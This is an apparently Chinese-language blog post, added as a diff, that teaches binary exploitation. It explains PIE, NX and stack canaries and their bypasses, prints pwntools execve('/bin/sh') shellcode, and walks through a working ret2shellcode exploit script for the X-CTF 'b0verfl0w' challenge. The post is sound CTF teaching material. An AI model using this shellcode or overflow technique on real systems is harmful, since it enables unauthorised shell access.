@@ -1,0 +1,369 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>PWN-shellcode | LeonChow</title>
+
+  
+  <meta name="author" content="Chow">
+  
+
+  
+  <meta name="description" content="PWN-shellcode在开始之前呢首先我们先了解一下编译器开启的一些保护措施
+一、PIE 的基本概念PIE（Position Independent Executable） 是现代操作系统中用于提升安全性的一个关键机制。它允许可执行文件在运行时被加载到内存中的任意地址，而不是一个固定的地址，从而配合 ASLR（Address Space Layout Randomization） 进行地址空间的随机化，防止攻击者预测代码地址。">
+  
+
+  
+  
+  <meta name="keywords" content="pwn">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="PWN-shellcode"/>
+
+  <meta property="og:site_name" content="LeonChow"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="LeonChow" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">LeonChow</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>PWN-shellcode</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2025/06/03/PWN-shellcode/" rel="bookmark">
+        <time class="entry-date published" datetime="2025-06-03T11:56:27.000Z">
+          2025-06-03
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h1 id="PWN-shellcode"><a href="#PWN-shellcode" class="headerlink" title="PWN-shellcode"></a>PWN-shellcode</h1><p>在开始之前呢首先我们先了解一下编译器开启的一些保护措施</p>
+<h1 id="一、PIE-的基本概念"><a href="#一、PIE-的基本概念" class="headerlink" title="一、PIE 的基本概念"></a>一、PIE 的基本概念</h1><p><strong>PIE（Position Independent Executable）</strong> 是现代操作系统中用于提升安全性的一个关键机制。它允许可执行文件在运行时被加载到内存中的任意地址，而不是一个固定的地址，从而配合 <strong>ASLR（Address Space Layout Randomization）</strong> 进行地址空间的随机化，防止攻击者预测代码地址。</p>
+<span id="more"></span>
+
+<h3 id="1-什么是-PIE？"><a href="#1-什么是-PIE？" class="headerlink" title="1. 什么是 PIE？"></a>1. 什么是 PIE？</h3><p>PIE（Position Independent Executable，位置无关可执行文件）是一种编译方式，使得整个程序（包括代码段和数据段）都支持位置无关（Position Independent Code, PIC）。PIE 程序在加载时可以被映射到内存中的任意地址。</p>
+<h3 id="2-为什么需要-PIE？"><a href="#2-为什么需要-PIE？" class="headerlink" title="2. 为什么需要 PIE？"></a>2. 为什么需要 PIE？</h3><p>PIE 是为了支持 <strong>ASLR</strong>。如果程序是固定地址加载，即使系统启用了 ASLR，也无法随机化主程序的加载地址，攻击者可以轻易定位到关键代码位置。</p>
+<h3 id="3-PIE-和-PIC-的区别"><a href="#3-PIE-和-PIC-的区别" class="headerlink" title="3. PIE 和 PIC 的区别"></a>3. PIE 和 PIC 的区别</h3><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>PIC</th>
+<th>PIE</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>应用</td>
+<td>通常用于共享库（.so）</td>
+<td>用于整个可执行文件</td>
+</tr>
+<tr>
+<td>是否独立执行</td>
+<td>否（依附主程序）</td>
+<td>是（本身是一个独立程序）</td>
+</tr>
+<tr>
+<td>支持ASLR</td>
+<td>否（主程序不支持）</td>
+<td>是（主程序支持）</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="二、PIE-的工作原理"><a href="#二、PIE-的工作原理" class="headerlink" title="二、PIE 的工作原理"></a>二、PIE 的工作原理</h2><ol>
+<li>PIE 编译时生成的是 <strong>位置无关代码</strong>（通过寄存器偏移访问全局数据、函数指针等），与共享库相似。</li>
+<li>加载器可以将 PIE 可执行文件映射到随机的内存地址。</li>
+<li>所有符号引用通过基址加偏移的方式计算地址，而非固定地址。</li>
+</ol>
+<hr>
+<h2 id="三、如何启用和识别-PIE"><a href="#三、如何启用和识别-PIE" class="headerlink" title="三、如何启用和识别 PIE"></a>三、如何启用和识别 PIE</h2><h3 id="1-编译启用-PIE"><a href="#1-编译启用-PIE" class="headerlink" title="1. 编译启用 PIE"></a>1. 编译启用 PIE</h3><p>在使用 <code>gcc</code> 或 <code>clang</code> 时，加上以下参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIE -pie main.c -o main</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、PIE-的优点与缺点"><a href="#四、PIE-的优点与缺点" class="headerlink" title="四、PIE 的优点与缺点"></a>四、PIE 的优点与缺点</h2><h3 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h3><ul>
+<li>支持 ASLR，增强安全性，降低 Exploit 的可靠性。</li>
+<li>防止 ROP（Return Oriented Programming）攻击中 gadget 地址的硬编码。</li>
+</ul>
+<h3 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h3><ul>
+<li>运行时性能稍有下降（需要计算偏移地址）。</li>
+<li>编译和链接略复杂（需要处理基地址偏移等问题）。</li>
+<li>即使编译的时候开启了PIE而操作系统没有开启ASLR那么PIE是无效的 因为PIE是基于ASLR实现的</li>
+</ul>
+<h1 id="二、NX"><a href="#二、NX" class="headerlink" title="二、NX"></a>二、NX</h1><p><strong>NX保护（No eXecute &#x2F; 数据不可执行）</strong> 是现代操作系统中的一项关键内存安全保护机制，用于防止恶意代码执行。它主要通过标记内存页是否允许执行来阻止 <strong>缓冲区溢出</strong> 和 <strong>Shellcode 注入攻击</strong>。</p>
+<hr>
+<h2 id="一、什么是-NX-保护？"><a href="#一、什么是-NX-保护？" class="headerlink" title="一、什么是 NX 保护？"></a>一、什么是 NX 保护？</h2><p><strong>NX（No eXecute）</strong>，也叫 <strong>DEP（Data Execution Prevention）</strong>，是一种内存页访问权限控制技术。其核心思想是：</p>
+<blockquote>
+<p><strong>只允许代码段执行，禁止数据段执行。</strong></p>
+</blockquote>
+<p>攻击者常常通过缓冲区溢出将 Shellcode 注入堆栈、堆中，如果这些内存区域标记为不可执行，则注入的代码就无法被 CPU 执行，从而阻止了漏洞利用。</p>
+<h2 id="二、在编译时启用-NX"><a href="#二、在编译时启用-NX" class="headerlink" title="二、在编译时启用 NX"></a>二、在编译时启用 NX</h2><p>通常，现代编译器默认会生成 NX 支持的可执行文件。如果你使用的是较老的系统或手动编译，建议添加以下编译器参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z noexecstack main.c -o main</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、绕过-NX-的常见方法（供防御者理解）"><a href="#三、绕过-NX-的常见方法（供防御者理解）" class="headerlink" title="三、绕过 NX 的常见方法（供防御者理解）"></a>三、绕过 NX 的常见方法（供防御者理解）</h2><p>虽然 NX 能阻止代码注入执行，但无法防止地址复用。攻击者常用以下技巧绕过 NX：</p>
+<table>
+<thead>
+<tr>
+<th>绕过方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>ROP</strong>（Return Oriented Programming）</td>
+<td>利用已有的代码片段（gadget）拼装攻击链</td>
+</tr>
+<tr>
+<td><strong>ret2libc</strong></td>
+<td>重定向控制流执行 libc 中的 <code>system(&quot;/bin/sh&quot;)</code></td>
+</tr>
+<tr>
+<td><strong>JIT Spraying</strong></td>
+<td>针对浏览器 JIT 编译器进行攻击，构造可执行段</td>
+</tr>
+<tr>
+<td><strong>mprotect&#x2F;mmap 执行页改写</strong></td>
+<td>利用已知函数改变页权限使数据可执行（需泄漏地址）</td>
+</tr>
+</tbody></table>
+<p>因此，实际防护中应配合 ASLR、Stack Canary、RELRO 等机制一起使用。</p>
+<h1 id="三、Canary-的工作机制"><a href="#三、Canary-的工作机制" class="headerlink" title="三、Canary 的工作机制"></a>三、Canary 的工作机制</h1><h3 id="1-栈帧布局改变（有-Canary-时）"><a href="#1-栈帧布局改变（有-Canary-时）" class="headerlink" title="1. 栈帧布局改变（有 Canary 时）"></a>1. 栈帧布局改变（有 Canary 时）</h3><p>以 x86 为例，函数栈帧布局：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sql复制编辑+---------------------+</span><br><span class="line">| 返回地址            | ← old EBP</span><br><span class="line">+---------------------+</span><br><span class="line">| Canary（金丝雀）    |</span><br><span class="line">+---------------------+</span><br><span class="line">| 局部变量/缓冲区等   |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-运行流程"><a href="#2-运行流程" class="headerlink" title="2. 运行流程"></a>2. 运行流程</h3><ul>
+<li><strong>函数调用时</strong>：编译器插入代码生成随机的 Canary 值并压入栈中。</li>
+<li><strong>函数返回前</strong>：编译器插入代码检测栈上的 Canary 值是否被修改。</li>
+<li><strong>若值被篡改</strong>：说明存在栈溢出攻击，程序触发 <code>__stack_chk_fail()</code>，<strong>立刻终止运行</strong>。</li>
+</ul>
+<hr>
+<h2 id="一、Canary-的类型"><a href="#一、Canary-的类型" class="headerlink" title="一、Canary 的类型"></a>一、Canary 的类型</h2><p>GCC 实现中，常见的 Canary 类型有三种：</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Terminator Canary</strong></td>
+<td>包含不可打印字符（如 <code>0x00</code>、<code>0x0D</code>、<code>0x0A</code>），防止 <code>strcpy()</code> 等函数覆盖它</td>
+</tr>
+<tr>
+<td><strong>Random Canary</strong></td>
+<td>每次程序运行时随机生成，攻击者很难猜到其值</td>
+</tr>
+<tr>
+<td><strong>TLS-based Canary</strong></td>
+<td>每线程独立一个 Canary，提高多线程程序的安全性</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="二、编译启用-Canary"><a href="#二、编译启用-Canary" class="headerlink" title="二、编译启用 Canary"></a>二、编译启用 Canary</h2><h3 id="1-GCC-编译选项"><a href="#1-GCC-编译选项" class="headerlink" title="1. GCC 编译选项"></a>1. GCC 编译选项</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-fstack-protector</code></td>
+<td>保护包含数组等变量的函数</td>
+</tr>
+<tr>
+<td><code>-fstack-protector-strong</code></td>
+<td>保护更多函数（推荐）</td>
+</tr>
+<tr>
+<td><code>-fstack-protector-all</code></td>
+<td>所有函数都启用 Canary</td>
+</tr>
+</tbody></table>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fstack-protector-strong -o main main.c</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、Canary-绕过难点与攻击方式"><a href="#三、Canary-绕过难点与攻击方式" class="headerlink" title="三、Canary 绕过难点与攻击方式"></a>三、Canary 绕过难点与攻击方式</h2><p>虽然 Canary 提高了安全性，但理论上不是绝对不可绕过的。常见绕过方式包括：</p>
+<table>
+<thead>
+<tr>
+<th>绕过方法</th>
+<th>原理</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>信息泄露</strong></td>
+<td>通过漏洞泄露 Canary 的值，再构造 Payload</td>
+</tr>
+<tr>
+<td><strong>非溢出攻击</strong></td>
+<td>使用 UAF、格式化字符串、Heap 攻击等绕过 Canary</td>
+</tr>
+<tr>
+<td><strong>不破坏 Canary 的攻击</strong></td>
+<td>比如 ROP，不需要覆盖返回地址或覆盖前先保留 Canary</td>
+</tr>
+<tr>
+<td><strong>覆盖结构体指针</strong></td>
+<td>Canary 只保护返回地址，不保护所有栈数据</td>
+</tr>
+</tbody></table>
+<h2 id="四、Canary-的局限性"><a href="#四、Canary-的局限性" class="headerlink" title="四、Canary 的局限性"></a>四、Canary 的局限性</h2><table>
+<thead>
+<tr>
+<th>局限点</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>只检测返回地址破坏</td>
+<td>无法防止其他类型的数据破坏</td>
+</tr>
+<tr>
+<td>信息泄露可被绕过</td>
+<td>一旦泄漏 Canary 值，保护失效</td>
+</tr>
+<tr>
+<td>性能影响（极小）</td>
+<td>每个函数都多一次 Canary 检查（几乎忽略不计）</td>
+</tr>
+</tbody></table>
+<h1 id="shellcode是什么？"><a href="#shellcode是什么？" class="headerlink" title="shellcode是什么？"></a>shellcode是什么？</h1><p>shellcode 其实就是一小段代码 可以用于软件漏洞利用的载荷 被称为 shellcode 是因为它通常启动一个命令终端 攻击者可以通过这个终端控制受害的计算机 但是所有执行类似任务的代码片段都可以称作shellcode Shellcode通常是以机器码形式编写的</p>
+<p>在Pwntools中 内置了一些shellcode与编译方式 只需要使用以下方式就可以调用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(shellcraft.amd64.sh())</span><br></pre></td></tr></table></figure>
+
+<p>输出如下所示</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">└─[$]&gt; /usr/<span class="built_in">bin</span>/python3 /home/pwn/桌面/pwn/山化课程/day02-ret2shellcode/testshellcode.py</span><br><span class="line">    /* execve(path=<span class="string">&#x27;/bin///sh&#x27;</span>, argv=[<span class="string">&#x27;sh&#x27;</span>], envp=<span class="number">0</span>) */</span><br><span class="line">    /* push <span class="string">b&#x27;/bin///sh\x00&#x27;</span> */</span><br><span class="line">    push <span class="number">0x68</span></span><br><span class="line">    mov rax, <span class="number">0x732f2f2f6e69622f</span></span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    /* push argument array [<span class="string">&#x27;sh\x00&#x27;</span>] */</span><br><span class="line">    /* push <span class="string">b&#x27;sh\x00&#x27;</span> */</span><br><span class="line">    push <span class="number">0x1010101</span> ^ <span class="number">0x6873</span></span><br><span class="line">    xor dword ptr [rsp], <span class="number">0x1010101</span></span><br><span class="line">    xor esi, esi /* <span class="number">0</span> */</span><br><span class="line">    push rsi /* null terminate */</span><br><span class="line">    push <span class="number">8</span></span><br><span class="line">    pop rsi</span><br><span class="line">    add rsi, rsp</span><br><span class="line">    push rsi /* <span class="string">&#x27;sh\x00&#x27;</span> */</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx /* <span class="number">0</span> */</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* <span class="number">0x3b</span> */</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
+
+<p>套用asm函数 就可以得到对应的shellcode 但是注意在调用前需要设置架构</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(asm(shellcraft.amd64.sh()))</span><br></pre></td></tr></table></figure>
+
+<p>输出如下所示</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>ret2shellcode 即控制程序执行shellcode代码 shellcode指的是用于完成某个功能的汇编代码 常见的功能主要是获取目标系统的shell</p>
+<p>一般来说shellcode需要我们自已填充 这其实是另外一种典型的利用方法 即此时我们需要自已去填充一些可执行的代码 这种手法不需要程序内部具有system之类的函数 在最早的时候十分常见</p>
+<p>在栈溢出的基础上 要想执行shellcode 需要对应的binary在运行时 shellcode所在的区域具有可执行权限</p>
+<p><img src="/2025/06/03/PWN-shellcode/image-20250603203551082.png" alt="image-20250603203551082"></p>
+<p>第一种利用方式</p>
+<p>根据函数调用约定 在一个函数执行的最后是一个 leave ret </p>
+<p>实质是</p>
+<p>mov esp,ebp</p>
+<p>pop ebp</p>
+<p>pop eip</p>
+<p>这时候我们在填充一个shellcode 然后控制返回地址为 <code>jmp esp</code> 即可利用</p>
+<p><img src="/2025/06/03/PWN-shellcode/image-20250603203714001.png" alt="image-20250603203714001"></p>
+<p>之后拿到例题开始复现</p>
+<p>使用checksec查保护</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec --file=b0verfl0w</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">─[$]&gt; checksec --file=b0verfl0w</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span><br><span class="line">Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   74 Symbols	  No	0	2b0verfl0w</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>未开启任何保护</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+18h] [ebp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWelcome to X-CTF 2016!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s.&quot;</span>, s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是函数的主函数</p>
+<p>然后我们现在需要的就是一个 jmp esp的地址 然后我们就要使用到 ROPgadget和ropper两个工具查找</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary b0verfl0w --only &quot;jmp&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x080483ab</span> : jmp <span class="number">0x8048390</span></span><br><span class="line"><span class="number">0x080484f2</span> : jmp <span class="number">0x8048470</span></span><br><span class="line"><span class="number">0x08048611</span> : jmp <span class="number">0x8048620</span></span><br><span class="line"><span class="number">0x0804855d</span> : jmp dword ptr [ecx + <span class="number">0x804a040</span>]</span><br><span class="line"><span class="number">0x08048550</span> : jmp dword ptr [ecx + <span class="number">0x804a060</span>]</span><br><span class="line"><span class="number">0x0804876f</span> : jmp dword ptr [ecx]</span><br><span class="line"><span class="number">0x08048504</span> : jmp esp</span><br></pre></td></tr></table></figure>
+
+<p>0x08048504 就找到了我们的地址</p>
+<p>定位泄露位置可以通过ida计算</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-0000000000000020</span>     <span class="type">char</span> s;</span><br><span class="line"><span class="number">-000000000000001F</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000001</span>E     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000001</span>D     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000001</span>C     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000001B</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000001</span>A     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000019</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000018</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000017</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000016</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000015</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000014</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000013</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000012</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000011</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000010</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000000F</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000000</span>E     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000000</span>D     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000000</span>C     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000000B</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000000</span>A     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000009</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000008</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000007</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000006</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000005</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000004</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000003</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000002</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000001</span>     <span class="comment">// padding byte</span></span><br><span class="line">+<span class="number">0000000000000000</span>     _DWORD __saved_registers;</span><br><span class="line">+<span class="number">0000000000000004</span>     _UNKNOWN *__return_address;</span><br></pre></td></tr></table></figure>
+
+<p>s -&gt; return 是 0x20 + 4 &#x3D; 32+4 &#x3D; 36</p>
+<p>然后我们就可以写出脚本了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./b0verfl0w&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">jmp_esp = <span class="number">0x08048504</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">36</span> + p32(jmp_esp) + asm(shellcraft.i386.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/pwn/">pwn</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2025 Chow
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
